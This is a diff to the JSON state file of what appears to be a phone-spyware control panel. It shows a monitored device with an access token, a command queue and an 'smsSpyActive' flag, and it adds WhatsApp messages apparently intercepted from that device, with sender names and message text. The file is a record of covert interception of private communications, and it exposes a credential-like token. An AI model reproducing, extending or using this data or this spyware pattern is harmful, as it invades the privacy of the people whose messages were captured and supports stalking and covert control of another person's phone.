@@ -4,7 +4,7 @@
     "deviceName": "HP-4045-4351",
     "ownerUsername": "rizz tuer",
     "token": "1ea24d96a5a50eac66ba80cd7678f908",
-    "lastSeen": 1775615958357,
+    "lastSeen": 1775615964367,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T02:20:09.530Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Anda",
+        "content": "samaa temennyaa aini sayangggg",
+        "time": "08/04 09:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775615967214
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "aini bocilll🤏",
+        "content": "‎2 pesan baru",
+        "time": "08/04 09:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775615958718
+      },
       {
         "appName": "WhatsApp",
         "sender": "aini bocilll🤏",
